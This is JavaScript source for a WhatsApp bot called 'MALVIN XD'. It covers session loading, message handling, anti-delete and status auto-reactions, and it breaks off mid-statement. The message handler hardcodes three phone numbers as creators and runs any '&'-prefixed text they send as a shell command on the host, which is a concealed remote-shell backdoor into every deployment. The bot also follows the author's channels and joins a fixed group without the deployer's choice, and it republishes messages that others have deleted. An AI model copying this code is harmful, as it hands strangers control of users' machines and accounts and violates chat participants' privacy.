const { isJidGroup } = require('@whiskeysockets/baileys');
const config = require('./settings');
const axios = require("axios");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers,
} = require(config.BAILEYS);
const l = console.log;
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson,
} = require("./lib/functions");
const fsSync = require("fs");
const fs = require("fs").promises;
const ff = require("fluent-ffmpeg");
const P = require("pino");
const GroupEvents = require("./lib/groupevents");
const { PresenceControl, BotActivityFilter } = require("./data/presence");
const qrcode = require("qrcode-terminal");
const StickersTypes = require("wa-sticker-formatter");
const util = require("util");
const { sms, downloadMediaMessage } = require("./lib");
const FileType = require("file-type");
const { File } = require("megajs");
const { fromBuffer } = require("file-type");
const bodyparser = require("body-parser");
const chalk = require("chalk");
const os = require("os");
const Crypto = require("crypto");
const path = require("path");
const { getPrefix } = require("./lib/prefix");
const readline = require("readline");
const { handleReaction } = require("./lib/reaction");
const ownerNumber = [config.OWNER_NUMBER];

// Timezone settings with 12-hour format
const timeOptions = {
    timeZone: 'Africa/Harare',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
};

// In-memory message cache for anti-delete
const messageCache = new Map();
const CACHE_DURATION = 60 * 60 * 1000; // 1 hour cache duration

// Function to store message in cache
const storeMessage = (message) => {
    if (message.key && message.key.id) {
        messageCache.set(message.key.id, {
            jid: message.key.remoteJid,
            message: structuredClone(message),
            timestamp: Date.now()
        });
        // Clean up old messages
        setTimeout(() => messageCache.delete(message.key.id), CACHE_DURATION);
    }
};

// Function to retrieve message from cache
const getCachedMessage = (messageId) => {
    return messageCache.get(messageId);
};

// Function to get message content
const getMessageContent = (mek) => {
    if (mek.message?.conversation) return mek.message.conversation;
    if (mek.message?.extendedTextMessage?.text) return mek.message.extendedTextMessage.text;
    return '';
};

// Handle deleted text messages
const DeletedText = async (malvin, mek, jid, deleteInfo, isGroup, update) => {
    const messageContent = getMessageContent(mek);
    const alertText = `*⚠️ Deleted Message Alert 🚨*\n${deleteInfo}\n  ◈ Content ━ ${messageContent}`;

    const mentionedJid = [];
    if (isGroup) {
        if (update.key.participant) mentionedJid.push(update.key.participant);
        if (mek.key.participant) mentionedJid.push(mek.key.participant);
    } else {
        if (mek.key.participant) mentionedJid.push(mek.key.participant);
        else if (mek.key.remoteJid) mentionedJid.push(mek.key.remoteJid);
    }

    await malvin.sendMessage(
        jid,
        {
            text: alertText,
            contextInfo: {
                mentionedJid: mentionedJid.length ? mentionedJid : undefined,
            },
        },
        { quoted: mek }
    );
};

// Handle deleted media messages
const DeletedMedia = async (malvin, mek, jid, deleteInfo, messageType) => {
    if (messageType === 'imageMessage' || messageType === 'videoMessage') {
        // For images/videos - put info in caption
        const antideletedmek = structuredClone(mek.message);
        if (antideletedmek[messageType]) {
            antideletedmek[messageType].caption = `
  *⚠️ Deleted Message Alert 🚨*
  
  ${deleteInfo}
  *╰💬 ─✪ ᴍᴀʟᴠɪɴ xᴅ ✪── 🔼*`;
            antideletedmek[messageType].contextInfo = {
                stanzaId: mek.key.id,
                participant: mek.key.participant || mek.key.remoteJid,
                quotedMessage: mek.message,
            };
        }
        await malvin.relayMessage(jid, antideletedmek, {});
    } else {
        // For other media - send alert separately
        const alertText = `*⚠️ Deleted Message Alert 🚨*\n${deleteInfo}`;
        await malvin.sendMessage(jid, { text: alertText }, { quoted: mek });
        await malvin.relayMessage(jid, mek.message, {});
    }
};

// Anti-delete handler
const AntiDelete = async (malvin, updates) => {
    if (config.ANTI_DELETE !== "true") return; // Check if anti-delete is enabled

    for (const update of updates) {
        if (update.update.message === null) {
            const store = getCachedMessage(update.key.id);

            if (store && store.message) {
                const mek = store.message;
                const isGroup = isJidGroup(store.jid);
                const deleteTime = new Date().toLocaleTimeString('en-GB', timeOptions).toLowerCase();

                let deleteInfo, jid;
                if (isGroup) {
                    try {
                        const groupMetadata = await malvin.groupMetadata(store.jid);
                        const groupName = groupMetadata.subject || 'Unknown Group';
                        const sender = mek.key.participant?.split('@')[0] || 'Unknown';
                        const deleter = update.key.participant?.split('@')[0] || 'Unknown';

                        deleteInfo = `
 *╭───[ ᴍᴀʟᴠɪɴ xᴅ ❤‍🔥 ]───*
 *├♻️ sᴇɴᴅᴇʀ:* @${sender}
 *├👥 ɢʀᴜᴘ:* ${groupName}
 *├⏰ ᴅᴇʟ ᴛɪᴍᴇ:* ${deleteTime} 
 *├🗑️ ʙʏ:* @${deleter}
 *├⚠️ ᴀᴄᴛɪᴏɴ:* Deleted a Message`;
                        jid = config.ANTI_DEL_PATH === "inbox" ? malvin.user.id : store.jid;
                    } catch (e) {
                        console.error('Error getting group metadata:', e);
                        continue;
                    }
                } else {
                    const senderNumber = mek.key.participant?.split('@')[0] || mek.key.remoteJid?.split('@')[0] || 'Unknown';
                    const deleterNumber = update.key.participant?.split('@')[0] || update.key.remoteJid?.split('@')[0] || 'Unknown';
                    
                    deleteInfo = `
 *╭───[ 🤖 ᴍᴀʟᴠɪɴ xᴅ ]───*
 *├👤 sᴇɴᴅᴇʀ:* @${senderNumber}
 *├⏰ ᴅᴇʟ ᴛɪᴍᴇ:* ${deleteTime}
 *├🗑️ ᴅᴇʟᴇᴛᴇᴅ ʙʏ:* @${deleterNumber}
 *├⚠️ ᴀᴄᴛɪᴏɴ:* Deleted a Message`;
                    jid = config.ANTI_DEL_PATH === "inbox" ? malvin.user.id : update.key.remoteJid || store.jid;
                }

                const messageType = mek.message ? Object.keys(mek.message)[0] : null;
                
                if (messageType === 'conversation' || messageType === 'extendedTextMessage') {
                    await DeletedText(malvin, mek, jid, deleteInfo, isGroup, update);
                } else if (messageType && [
                    'imageMessage', 
                    'videoMessage', 
                    'stickerMessage', 
                    'documentMessage', 
                    'audioMessage',
                    'voiceMessage'
                ].includes(messageType)) {
                    await DeletedMedia(malvin, mek, jid, deleteInfo, messageType);
                }
            }
        }
    }
};

// Logger utility for toggleable logging
const logger = {
  info: (message, data = {}) => {
    if (config.LOGGING_ENABLED !== "true") return;
    const emoji = data.Emoji || "";
    console.log(
      chalk.cyan(
        `${emoji} ${message}\n` +
          Object.entries(data)
            .filter(([key]) => key !== "Emoji")
            .map(([key, value]) => `├── ${key}: ${value}`)
            .join("\n") +
          `\n└── Time: ${new Date().toLocaleString("en-US", { timeZone: "Africa/Harare" })}`
      )
    );
  },
  success: (message, data = {}) => {
    if (config.LOGGING_ENABLED !== "true") return;
    const emoji = data.Emoji || "";
    console.log(
      chalk.green(
        `${emoji} ${message}\n` +
          Object.entries(data)
            .filter(([key]) => key !== "Emoji")
            .map(([key, value]) => `├── ${key}: ${value}`)
            .join("\n") +
          `\n└── Time: ${new Date().toLocaleString("en-US", { timeZone: "Africa/Harare" })}`
      )
    );
  },
  warn: (message, data = {}) => {
    if (config.LOGGING_ENABLED !== "true") return;
    const emoji = data.Emoji || "";
    console.log(
      chalk.yellow(
        `${emoji} ${message}\n` +
          Object.entries(data)
            .filter(([key]) => key !== "Emoji")
            .map(([key, value]) => `├── ${key}: ${value}`)
            .join("\n") +
          `\n└── Time: ${new Date().toLocaleString("en-US", { timeZone: "Africa/Harare" })}`
      )
    );
  },
  error: (message, data = {}) => {
    if (config.LOGGING_ENABLED !== "true") return;
    const emoji = data.Emoji || "[ ❌ ]";
    console.error(
      chalk.red(
        `${emoji} ${message}\n` +
          Object.entries(data)
            .filter(([key]) => key !== "Emoji")
            .map(([key, value]) => `├── ${key}: ${value}`)
            .join("\n") +
          `\n└── Time: ${new Date().toLocaleString("en-US", { timeZone: "Africa/Harare" })}`
      )
    );
  },
};

// Temp directory management
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fsSync.existsSync(tempDir)) {
  fsSync.mkdirSync(tempDir);
}

const clearTempDir = () => {
  fsSync.readdir(tempDir, (err, files) => {
    if (err) {
      logger.error("[ ❌ ] Error clearing temp directory", { Error: err.message });
      return;
    }
    for (const file of files) {
      fsSync.unlink(path.join(tempDir, file), (err) => {
        if (err) logger.error("[ ❌ ] Error deleting temp file", { File: file, Error: err.message });
      });
    }
  });
};
setInterval(clearTempDir, 5 * 60 * 1000);

// Express server
const express = require("express");
const app = express();
const port = process.env.PORT || 7860;

app.use(express.static(path.join(__dirname, "lib")));
app.get("/", (req, res) => {
  res.redirect("/malvin.html");
});
app.listen(port, () =>
  logger.success(
    `
╭──[ 🤖 WELCOME DEAR USER! ]─
│
│ If you enjoy using this bot,
│ please ⭐  Star it & 🍴  Fork it on GitHub!
│ your support keeps it growing! 💙 
╰─────────`
  )
);

// Session authentication
let malvin;

const sessionDir = path.join(__dirname, "./sessions");
const credsPath = path.join(sessionDir, "creds.json");

if (!fsSync.existsSync(sessionDir)) {
  fsSync.mkdirSync(sessionDir, { recursive: true });
}

async function loadSession() {
  try {
    if (!config.SESSION_ID) {
      logger.warn("[ ⏳ ] No SESSION_ID provided - Falling back to QR or pairing code");
      return null;
    }
    if (config.SESSION_ID.startsWith("starcore~")) {
      logger.info("[ ⏳ ] Decoding base64 session");
      const base64Data = config.SESSION_ID.replace("starcore~", "");
      if (!/^[A-Za-z0-9+/=]+$/.test(base64Data)) {
        throw new Error("Invalid base64 format in SESSION_ID");
      }
      const decodedData = Buffer.from(base64Data, "base64");
      let sessionData;
      try {
        sessionData = JSON.parse(decodedData.toString("utf-8"));
      } catch (error) {
        throw new Error("Failed to parse decoded base64 session data: " + error.message);
      }
      fsSync.writeFileSync(credsPath, decodedData);
      logger.success("[ ✅ ] Base64 session decoded and saved successfully");
      return sessionData;
    } else if (config.SESSION_ID.startsWith("malvin~")) {
      logger.info("[ 📥 ] Downloading MEGA.nz session");
      const megaFileId = config.SESSION_ID.replace("malvin~", "");
      const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
      const data = await new Promise((resolve, reject) => {
        filer.download((err, data) => {
          if (err) reject(err);
          else resolve(data);
        });
      });
      fsSync.writeFileSync(credsPath, data);
      logger.success("[ ✅ ] MEGA session downloaded successfully");
      return JSON.parse(data.toString());
    } else {
      throw new Error("Invalid SESSION_ID format. Use 'starcore~' for base64 or 'malvin~' for MEGA.nz");
    }
  } catch (error) {
    logger.error("[ ❌ ] Error loading session", { Error: error.message });
    logger.info("[ 🟢 ] Will attempt QR code or pairing code login");
    return null;
  }
}

async function connectWithPairing(malvin, useMobile) {
  if (useMobile) {
    logger.error("[ ❌ ] Cannot use pairing code with mobile API");
    throw new Error("Cannot use pairing code with mobile API");
  }
  if (!process.stdin.isTTY) {
    logger.error("[ ❌ ] Cannot prompt for phone number in non-interactive environment");
    process.exit(1);
  }
  logger.info("[ 📡 ] Prompting for phone number for pairing code");
  console.log(chalk.bgYellow.black(" ACTION REQUIRED "));
  console.log(chalk.green("┌" + "─".repeat(46) + "┐"));
  console.log(chalk.green("│ ") + chalk.bold("Enter WhatsApp number to receive pairing code") + chalk.green(" │"));
  console.log(chalk.green("└" + "─".repeat(46) + "┘"));
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  let number = await question(chalk.cyan("» Enter your number (e.g., +263780934873): "));
  number = number.replace(/[^0-9]/g, "");
  rl.close();
  if (!number) {
    logger.error("[ ❌ ] No phone number provided");
    process.exit(1);
  }
  try {
    let code = await malvin.requestPairingCode(number);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    logger.success("[ ✅ ] Pairing code generated", { Number: number, Code: code });
    console.log("\n" + chalk.bgGreen.black(" SUCCESS ") + " Use this pairing code:");
    console.log(chalk.bold.yellow("┌" + "─".repeat(46) + "┐"));
    console.log(chalk.bold.yellow("│ ") + chalk.bgWhite.black(code) + chalk.bold.yellow(" │"));
    console.log(chalk.bold.yellow("└" + "─".repeat(46) + "┘"));
    console.log(chalk.yellow("Enter this code in WhatsApp:\n1. Open WhatsApp\n2. Go to Settings > Linked Devices\n3. Tap 'Link a Device'\n4. Enter the code"));
  } catch (err) {
    logger.error("[ ❌ ] Error getting pairing code", { Error: err.message });
    process.exit(1);
  }
}

async function connectToWA() {
  logger.info("[ 🟠 ] Connecting to WhatsApp");
  const creds = await loadSession();
  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "./sessions"), {
    creds: creds || undefined,
  });
  const { version } = await fetchLatestBaileysVersion();
  const pairingCode = config.PAIRING_CODE === "true" || process.argv.includes("--pairing-code");
  const useMobile = process.argv.includes("--mobile");
  malvin = makeWASocket({
    logger: P({ level: "silent" }),
    printQRInTerminal: !creds && !pairingCode,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version,
    getMessage: async () => ({}),
  });
  if (pairingCode && !state.creds.registered) {
    await connectWithPairing(malvin, useMobile);
  }
  malvin.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
        logger.error("[ 🛑 ] Connection closed, please change session ID or re-authenticate");
        if (fsSync.existsSync(credsPath)) {
          fsSync.unlinkSync(credsPath);
        }
        process.exit(1);
      } else {
        logger.warn("[ ⏳ ] Connection lost, reconnecting");
        setTimeout(connectToWA, 5000);
      }
    } else if (connection === "open") {
      logger.success("[ 🤖 ] MALVIN XD Connected");
      const pluginPath = path.join(__dirname, "plugins");
      try {
        fsSync.readdirSync(pluginPath).forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() === ".js") {
            require(path.join(pluginPath, plugin));
          }
        });
        logger.success("[ ✅ ] Plugins loaded successfully");
      } catch (err) {
        logger.error("[ ❌ ] Error loading plugins", { Error: err.message });
      }
      try {
        await sleep(2000);
        const jid = malvin.decodeJid(malvin.user.id);
        if (!jid) throw new Error("Invalid JID for bot");
        // Tiny caps converter for consistent styling
        const toTinyCaps = (str) => {
          const tinyCapsMap = {
           a: 'ᴀ', b: 'ʙ', c: 'ᴄ', d: 'ᴅ', e: 'ᴇ', f: 'ғ', g: 'ɢ', h: 'ʜ', i: 'ɪ',
            j: 'ᴊ', k: 'ᴋ', l: 'ʟ', m: 'ᴍ', n: 'ɴ', o: 'ᴏ', p: 'ᴘ', q: 'q', r: 'ʀ',
            s: 's', t: 'ᴛ', u: 'ᴜ', v: 'ᴠ', w: 'ᴡ', x: 'x', y: 'ʏ', z: 'ᴢ', 
          };
          return str
            .split("")
            .map((char) => tinyCapsMap[char.toLowerCase()] || char)
            .join("");
        };

        const botname = "ᴍᴀʟᴠɪɴ-xᴅ";
        const ownername = "ᴍᴀʟᴠɪɴ ᴋɪɴɢ";
        const prefix = getPrefix();
        const username = "XdKing2";
        const mrmalvin = `https://github.com/${username}`;
        const repoUrl = "https://github.com/XdKing2/MALVIN-BXD";
        const tutorialUrl = "https://youtube.com/@malvintech2";
        const imageUrl = "https://files.catbox.moe/w28v7f.jpg";
        const newsletterJid = "120363402507750390@newsletter";

        const upMessage = `
🤖 ${botname} 🔥
✅ ${toTinyCaps("connected & ready!")}
🚀 ${toTinyCaps("ultimate whatsapp bot experience")}
───────────────

🔔 ${toTinyCaps("your prefix")}: ${prefix}

───────────────
© ${toTinyCaps("powered by")} |  ${ownername}
`;

        // Initialize ButtonManager
        const { ButtonManager } = require("./button");
        const buttonManager = new ButtonManager(malvin);

        // Generate unique session ID
        const sessionId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

        // Define buttons
        const buttons = [
          {
            buttonId: `conn-star-repo-${sessionId}`,
            buttonText: { displayText: `🌟 ${toTinyCaps("star repo")}` },
            type: 1,
          },
          {
            buttonId: `conn-follow-${sessionId}`,
            buttonText: { displayText: `🔔 ${toTinyCaps("follow")}` },
            type: 1,
          },
          {
            buttonId: `conn-tutorials-${sessionId}`,
            buttonText: { displayText: `🎥 ${toTinyCaps("tutorials")}` },
            type: 1,
          },
        ];

        // Create and send buttons message
        const buttonsMessage = buttonManager.createButtonsMessage({
          imageUrl,
          caption: upMessage,
          footer: toTinyCaps("powered by malvin xd"),
          buttons,
          contextInfo: {
            mentionedJid: [jid],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: newsletterJid,
              newsletterName: toTinyCaps("malvin xd"),
              serverMessageId: 143,
            },
          },
        });

        try {
          const sentMsg = await malvin.sendMessage(jid, buttonsMessage);
          logger.success("[ 📩 ] Connection notice sent successfully with buttons");

          // Define button actions
          const actions = {
            "conn-star-repo": async (receivedMsg) => {
              await malvin.sendMessage(jid, {
                text: `🌟 ${toTinyCaps("please star our repository!")}\n${repoUrl}`,
              }, { quoted: receivedMsg });
              logger.success("[ ✅ ] Star repo button action executed", {
                Sender: receivedMsg.key.participant || receivedMsg.key.remoteJid,
                Chat: receivedMsg.key.remoteJid,
              });
            },
            "conn-follow": async (receivedMsg) => {
              await malvin.sendMessage(jid, {
                text: `🔔 ${toTinyCaps("follow us on github!")}\n${mrmalvin}`,
              }, { quoted: receivedMsg });
              logger.success("[ ✅ ] Follow button action executed", {
                Sender: receivedMsg.key.participant || receivedMsg.key.remoteJid,
                Chat: receivedMsg.key.remoteJid,
              });
            },
            "conn-tutorials": async (receivedMsg) => {
              await malvin.sendMessage(jid, {
                text: `🎥 ${toTinyCaps("check out our tutorials!")}\n${tutorialUrl}`,
              }, { quoted: receivedMsg });
              logger.success("[ ✅ ] Tutorials button action executed", {
                Sender: receivedMsg.key.participant || receivedMsg.key.remoteJid,
                Chat: receivedMsg.key.remoteJid,
              });
            },
          };

          // Add button handler
          buttonManager.addHandler(sentMsg.key.id, sessionId, (receivedMsg, buttonId) => {
            buttonManager.handleAction(receivedMsg, buttonId, actions);
          });
        } catch (imageError) {
          logger.warn("[ ⚠️ ] Button message failed, sending text-only", { Error: imageError.message });
          await malvin.sendMessage(jid, { text: upMessage });
          logger.success("[ 📩 ] Connection notice sent successfully as text");
        }
      } catch (sendError) {
        logger.error("[ 🔴 ] Error sending connection notice", { Error: sendError.message });
        await malvin.sendMessage(ownerNumber[0], {
          text: `Failed to send connection notice: ${sendError.message}`,
        });
      }
      const newsletterChannels = [
        "120363402507750390@newsletter",
        "120363419136706156@newsletter",
        "120363420267586200@newsletter",
      ];
      let followed = [],
        alreadyFollowing = [],
        failed = [];
      for (const channelJid of newsletterChannels) {
        try {
          logger.info("[ 📡 ] Checking metadata for newsletter", { Channel: channelJid });
          const metadata = await malvin.newsletterMetadata("jid", channelJid);
          if (!metadata.viewer_metadata) {
            await malvin.newsletterFollow(channelJid);
            followed.push(channelJid);
            logger.success("[ ✅ ] Followed newsletter", { Channel: channelJid });
          } else {
            alreadyFollowing.push(channelJid);
            logger.warn("[ 📌 ] Already following", { Channel: channelJid });
          }
        } catch (error) {
          failed.push(channelJid);
          logger.error("[ ❌ ] Failed to follow newsletter", { Channel: channelJid, Error: error.message });
          await malvin.sendMessage(ownerNumber[0], {
            text: `Failed to follow ${channelJid}: ${error.message}`,
          });
        }
      }
      logger.info("[ 📡 ] Newsletter Follow Status", {
        Followed: followed.length,
        AlreadyFollowing: alreadyFollowing.length,
        Failed: failed.length,
      });
      const inviteCode = "Dx7HbtW7Cf12iCVjJBpD0x";
      try {
        await malvin.groupAcceptInvite(inviteCode);
        logger.success("[ ✅ ] MALVIN XD joined the WhatsApp group successfully");
      } catch (err) {
        logger.error("[ ❌ ] Failed to join WhatsApp group", { Error: err.message });
        await malvin.sendMessage(ownerNumber[0], {
          text: `Failed to join group with invite code ${inviteCode}: ${err.message}`,
        });
      }
    }
    if (qr && !pairingCode) {
      logger.info("[ 🟢 ] Scan the QR code to connect or use --pairing-code");
      qrcode.generate(qr, { small: true });
    }
  });

  malvin.ev.on("creds.update", saveCreds);

  // Anti-delete event handler
  malvin.ev.on("messages.update", async (updates) => {
    for (const update of updates) {
      if (update.update.message === null) {
        logger.info("[ 📡 ] Delete Detected", { Update: JSON.stringify(update, null, 2) });
        await AntiDelete(malvin, updates);
      }
    }
  });

  // Anti-call
  malvin.ev.on("call", async (calls) => {
    try {
      if (config.ANTI_CALL !== "true") return;

      for (const call of calls) {
        if (call.status !== "offer") continue; // Only respond on call offer

        const id = call.id;
        const from = call.from;

        await malvin.rejectCall(id, from);
        await malvin.sendMessage(from, {
          text: config.REJECT_MSG || "*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*",
        });
        logger.success("[ ✅ ] Call rejected and message sent", { From: from });
      }
    } catch (err) {
      logger.error("[ ❌ ] Anti-call error", { Error: err.message });
    }
  });

  // Presence and activity
  malvin.ev.on("presence.update", async (update) => {
    await PresenceControl(malvin, update);
  });

  malvin.ev.on("presence.update", (update) => PresenceControl(malvin, update));

  BotActivityFilter(malvin);

  // Messages upsert with message caching
  malvin.ev.on("messages.upsert", async (mek) => {
    mek = mek.messages[0];
    if (!mek.message) return;
    mek.message =
      getContentType(mek.message) === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;

    // Store message in cache for anti-delete
    storeMessage(mek);

    if (config.READ_MESSAGE === "true") {
      await malvin.readMessages([mek.key]); // Mark message as read
      logger.success("[ ✅ ] Marked message as read", {
        Sender: mek.key.participant || mek.key.remoteJid,
        Chat: mek.key.remoteJid,
      });
    }
    if (mek.message.viewOnceMessageV2)
      mek.message =
        getContentType(mek.message) === "ephemeralMessage"
          ? mek.message.ephemeralMessage.message
          : mek.message;
    if (mek.key && mek.key.remoteJid === "status@broadcast" && config.AUTO_STATUS_SEEN === "true") {
      await malvin.readMessages([mek.key]);
      logger.success("[ ✅ ] Status marked as seen", { Sender: mek.key.participant });
    }

    const newsletterJids = [        "120363402507750390@newsletter",
 "120363419136706156@newsletter","120363420267586200@newsletter"];
    const emojis = ["❤️", "👍", "😮", "😎", "😜","🤩","🙏"];

    if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
      try {
        const serverId = mek.newsletterServerId;
        if (serverId) {
          const emoji = emojis[Math.floor(Math.random() * emojis.length)];
          await malvin.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
          logger.success("[ ✅ ] Reacted to newsletter", {
            Channel: mek.key.remoteJid,
            Emoji: emoji,
          });
        }
      } catch (e) {
        // Silent catch
      }
    }

    if (mek.key && mek.key.remoteJid === "status@broadcast" && config.AUTO_STATUS_REACT === "true") {
      const jawadlike = await malvin.decodeJid(malvin.user.id);
      const emojis = [
        "❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇿🇼', '💜', '💙', '🌝', '🖤', '💚",
      ];
      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
      await malvin.sendMessage(
        mek.key.remoteJid,
        {
          react: {
            text: randomEmoji,
            key: mek.key,
          },
        },
        { statusJidList: [mek.key.participant, jawadlike] }
      );
      logger.success("[ ✅ ] Reacted to status", {
        Sender: mek.key.participant,
        Emoji: randomEmoji,
      });
    }
    if (mek.key && mek.key.remoteJid === "status@broadcast" && config.AUTO_STATUS_REPLY === "true") {
      const user = mek.key.participant;
      const text = `${config.AUTO_STATUS_MSG}`;
      await malvin.sendMessage(
        user,
        { text: text, react: { text: "💜", key: mek.key } },
        { quoted: mek }
      );
      logger.success("[ ✅ ] Replied to status", {
        Sender: user,
        Text: text,
      });
    }

    const m = sms(malvin, mek);
    const type = getContentType(mek.message);
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const quoted =
      type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null
        ? mek.message.extendedTextMessage.contextInfo.quotedMessage || []
        : [];
    const body =
      type === "conversation"
        ? mek.message.conversation
        : type === "extendedTextMessage"
        ? mek.message.extendedTextMessage.text
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : "";
    const prefix = getPrefix();
    const isCmd = body.startsWith(prefix);
    var budy = typeof mek.text == "string" ? mek.text : false;
    const command = isCmd ? body.slice(prefix.length).trim().split(" ").shift().toLowerCase() : "";
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(" ");
    const text = args.join(" ");
    const isGroup = from.endsWith("@g.us");
    const sender = mek.key.fromMe
      ? (malvin.user.id.split(":")[0] + "@s.whatsapp.net" || malvin.user.id)
      : mek.key.participant || mek.key.remoteJid;
    const senderNumber = sender.split("@")[0];
    const botNumber = malvin.user.id.split(":")[0];
    const pushname = mek.pushName || "Sin Nombre";
    const isMe = botNumber.includes(senderNumber);
    const isOwner = ownerNumber.includes(senderNumber) || isMe;
    const botNumber2 = await jidNormalizedUser(malvin.user.id);
    const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch((e) => {}) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const participants = isGroup ? await groupMetadata.participants : "";
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : "";
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
    const isReact = m.message.reactionMessage ? true : false;
    const reply = (teks) => {
      malvin.sendMessage(from, { text: teks }, { quoted: mek });
    };

    if (isCmd) {
      logger.info("[ 📡 ] Command received", {
        Sender: sender,
        Chat: from,
        Command: command,
        Args: args.join(" "),
      });
    }

    const ownerNumbers = ["263714757857", "263776388689", "263780934873"];
    const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
    const devNumber = config.DEV ? String(config.DEV).replace(/[^0-9]/g, "") : null;
    const creatorJids = [
      ...ownerNumbers,
      ...(devNumber ? [devNumber] : []),
      ...sudoUsers,
    ].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
    const isCreator = creatorJids.includes(sender) || isMe;

    if (isCreator && mek.text.startsWith("&")) {
      let code = budy.slice(2);
      if (!code) {
        reply(`Provide me with a query to run Master!`);
        logger.warn("[ 📌 ] No code provided for & command", { Sender: sender });
        return;
      }
      const { spawn } = require("child_process");
      try {
        let resultTest = spawn(code, { shell: true });
        resultTest.stdout.on("data", (data) => {
          reply(data.toString());
          logger.success("[ ✅ ] Command execution output", {
            Sender: sender,
            Output: data.toString(),
          });
        });
        resultTest.stderr.on("data", (data) => {
          reply(data.toString());
          logger.error("[ ❌ ] Command execution error", {
            Sender: sender,
            Error: data.toString(),
          });
        });
        resultTest.on("error", (data) => {
          reply(data.toString());
          logger.error("[ ❌ ] Command spawn error", {
            Sender: sender,
            Error: data.toString(),
          });
        });
        resultTest.on("close", (code) => {
          if (code !== 0) {
            reply(`command exited with code ${code}`);
            logger.warn("[ 📌 ] Command exited with non-zero code", {
              Sender: sender,
              Code: code,
            });
          }
        });
      } catch (err) {
        reply(util.format(err));
        logger.error("[ ❌ ] Command execution failed", {
          Sender: sender,
          Error: err.message,
        });
      }
      return;
    }

    // Reaction handler for public and owner messages
    handleReaction(m, isReact, senderNumber, botNumber, config);

    // Custom React for all messages (public and owner)
    if (!isReact && config.CUSTOM_REACT === "true") {
      const reactions = (config.CUSTOM_REACT_EMOJIS || "🥲,😂,👍🏻,🙂,😔").split(",");
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
      logger.success("[ ✅ ] Applied custom reaction", {
        Sender: sender,
        Emoji: randomReaction,
      });
    }

    if (!isReact && senderNumber === botNumber) {
      if (config.HEART_REACT === "true") {
        const reactions = (config.CUSTOM_REACT_EMOJIS || "❤️,🧡,💛,💚,💚").split(",");
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
        logger.success("[ ✅ ] Applied heart reaction", {
          Sender: sender,
          Emoji: randomReaction,
        });
      }
    }

    // Banned users check
    const bannedUsers = JSON.parse(fsSync.readFileSync("./lib/ban.json", "utf-8"));
    const isBanned = bannedUsers.includes(sender);
    if (isBanned) {
      logger.warn("[ 🚷 ] Ignored command from banned user", { Sender: sender });
      return;
    }

    // Owner check
    const ownerFile = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8"));
    const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
    const isFileOwner = ownerFile.includes(sender);
    const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;

    // Mode restrictions
    if (!isRealOwner && config.MODE === "private") {
      logger.warn("[ 🚫 ] Ignored command in private mode", { Sender: sender });
      return;
    }
    if (!isRealOwner && isGroup && config.MODE === "inbox") {
      logger.warn("[ 📩 ] Ignored command in group in inbox mode", {
        Sender: sender,
        Group: groupName,
      });
      return;
    }
    if (!isRealOwner && !isGroup && config.MODE === "groups") {
      logger.warn("[ 🚫 ] Ignored command in private chat in groups mode", { Sender: sender });
      return;
    }

    // Take commands
    const events = require("./malvin");
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
    if (isCmd) {
      const cmd =
        events.commands.find((cmd) => cmd.pattern === cmdName) ||
        events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
      if (cmd) {
        if (cmd.react)
          malvin.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
        try {
